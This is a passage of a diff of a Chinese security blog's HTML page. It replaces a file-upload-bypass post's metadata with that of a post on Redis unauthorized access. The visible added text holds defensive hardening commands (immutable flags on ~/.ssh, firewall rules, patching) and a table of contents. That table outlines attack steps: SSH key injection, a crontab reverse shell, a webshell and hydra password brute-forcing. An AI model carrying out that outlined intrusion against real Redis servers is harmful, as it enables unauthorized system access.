+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
+<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh</div></pre></td></tr></table></figure></p>
+<ul>
+<li>设置防火墙策略<br>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</li>
+<li>安全补丁<br>不定期关注最新软件版本，并升级redis到最新版，防止新漏洞被利用。</li>
+</ul>
 
       
     </div>
@@ -462,12 +507,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/09/16/文件上传漏洞解析及绕过姿势/">文件上传漏洞解析及绕过姿势</a></p>
+  <p><span>本文标题:</span><a href="/2018/03/18/redis未授权访问/">redis未授权访问</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Y-HKL 的个人博客">Y-HKL</a></p>
-  <p><span>发布时间:</span>2017年09月16日 - 22:09</p>
-  <p><span>最后更新:</span>2017年09月16日 - 23:09</p>
-  <p><span>原始链接:</span><a href="/2017/09/16/文件上传漏洞解析及绕过姿势/" title="文件上传漏洞解析及绕过姿势">http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年03月18日 - 23:03</p>
+  <p><span>最后更新:</span>2018年03月19日 - 01:03</p>
+  <p><span>原始链接:</span><a href="/2018/03/18/redis未授权访问/" title="redis未授权访问">http://y-hkl.top/2018/03/18/redis未授权访问/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://y-hkl.top/2018/03/18/redis未授权访问/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -514,7 +559,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/文件上传漏洞/" rel="tag"><i class="fa fa-tag"></i> 文件上传漏洞</a>
+            <a href="/tags/redis/" rel="tag"><i class="fa fa-tag"></i> redis</a>
+          
+            <a href="/tags/redis未授权访问/" rel="tag"><i class="fa fa-tag"></i> redis未授权访问</a>
           
         </div>
       
@@ -527,8 +574,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/16/逻辑漏洞之密码重置/" rel="next" title="逻辑漏洞之密码重置">
-                <i class="fa fa-chevron-left"></i> 逻辑漏洞之密码重置
+              <a href="/2018/02/20/使用Nmap验证漏洞/" rel="next" title="使用Nmap验证漏洞">
+                <i class="fa fa-chevron-left"></i> 使用Nmap验证漏洞
               </a>
             
           </div>
@@ -536,10 +583,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/16/POC编写基础知识/" rel="prev" title="POC编写基础知识">
-                POC编写基础知识 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -758,7 +801,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传校验姿势"><span class="nav-number">1.</span> <span class="nav-text">文件上传校验姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#客户端JS验证"><span class="nav-number">2.</span> <span class="nav-text">客户端JS验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证代码"><span class="nav-number">2.1.</span> <span class="nav-text">验证代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过姿势"><span class="nav-number">2.2.</span> <span class="nav-text">绕过姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件头content-type字段校验（image-gif）"><span class="nav-number">3.</span> <span class="nav-text">文件头content-type字段校验（image/gif）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证测试代码"><span class="nav-number">3.1.</span> <span class="nav-text">验证测试代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过方式"><span class="nav-number">3.2.</span> <span class="nav-text">绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">4.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试代码"><span class="nav-number">4.1.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过技巧"><span class="nav-number">4.2.</span> <span class="nav-text">绕过技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端检测文件头"><span class="nav-number">5.</span> <span class="nav-text">服务端检测文件头</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件头简介"><span class="nav-number">5.1.</span> <span class="nav-text">文件头简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过方式-1"><span class="nav-number">5.2.</span> <span class="nav-text">绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器段安装WAF"><span class="nav-number">6.</span> <span class="nav-text">服务器段安装WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过方法"><span class="nav-number">6.1.</span> <span class="nav-text">绕过方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全建议"><span class="nav-number">7.</span> <span class="nav-text">安全建议</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#redis介绍"><span class="nav-number">1.</span> <span class="nav-text">redis介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞介绍"><span class="nav-number">2.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis安全漏洞影响"><span class="nav-number">3.</span> <span class="nav-text">Redis安全漏洞影响</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">4.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞验证"><span class="nav-number">5.</span> <span class="nav-text">漏洞验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞验证-1"><span class="nav-number">6.</span> <span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取敏感信息"><span class="nav-number">6.1.</span> <span class="nav-text">获取敏感信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入SSH公钥，获取操作系统权限"><span class="nav-number">6.2.</span> <span class="nav-text">写入SSH公钥，获取操作系统权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">6.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">6.2.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击详情"><span class="nav-number">6.2.3.</span> <span class="nav-text">攻击详情</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用crontab反弹shell"><span class="nav-number">6.3.</span> <span class="nav-text">利用crontab反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#端口监听"><span class="nav-number">6.3.1.</span> <span class="nav-text">端口监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击详情-1"><span class="nav-number">6.3.2.</span> <span class="nav-text">攻击详情</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取web服务的webshell"><span class="nav-number">6.4.</span> <span class="nav-text">获取web服务的webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用hydra暴力破解redis的密码"><span class="nav-number">7.</span> <span class="nav-text">利用hydra暴力破解redis的密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方案"><span class="nav-number">8.</span> <span class="nav-text">修复方案</span></a></li></ol></div>
             
 
           </div>
@@ -913,9 +956,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/';
-          this.page.identifier = '2017/09/16/文件上传漏洞解析及绕过姿势/';
-          this.page.title = '文件上传漏洞解析及绕过姿势';
+          this.page.url = 'http://y-hkl.top/2018/03/18/redis未授权访问/';
+          this.page.identifier = '2018/03/18/redis未授权访问/';
+          this.page.title = 'redis未授权访问';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://.disqus.com/embed.js';
